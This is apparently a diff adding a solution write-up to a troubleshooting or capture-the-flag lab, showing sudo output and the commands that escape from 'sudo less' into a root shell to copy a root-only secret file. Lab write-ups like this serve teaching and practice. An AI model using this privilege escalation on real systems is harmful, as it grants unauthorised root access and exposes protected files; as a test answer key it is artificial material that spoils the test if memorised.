@@ -14,3 +14,49 @@ Test: As the user "admin", md5sum /home/admin/solution.txt returns 52a55258e4d53
 
 ### Solution
 
+#### 1. list what sudo permissions the admin has
+
+We can run the `less` command as `root` if the first argument is `/var/log/*`.
+
+```
+admin@i-0adfc7a1f5cd64cfb:~$ sudo -l
+Matching Defaults entries for admin on i-0adfc7a1f5cd64cfb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User admin may run the following commands on i-0adfc7a1f5cd64cfb:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/less /var/log/*
+```
+
+#### 2. Interactive shell from within less
+
+1. Open any log file as root (no password required):
+
+```
+sudo less /var/log/cloud-init.log
+```
+
+2. Inside less, type the following and press Enter:
+
+```
+!sh
+```
+
+3. copy /root/secret.txt to /home/admin.solution.txt
+
+```
+# cd /root/   
+# ls
+secret.txt
+# cp secret.txt /home/admin/solution.txt
+# cat secret.txt
+<detached>
+# cd /home/admin/agent
+# ls
+check.sh  sadagent  sadagent.txt
+# ./check.sh
+OK#
+# cd /home/admin
+# chmod 777 solution.txt // allow the check script to read this file
+```
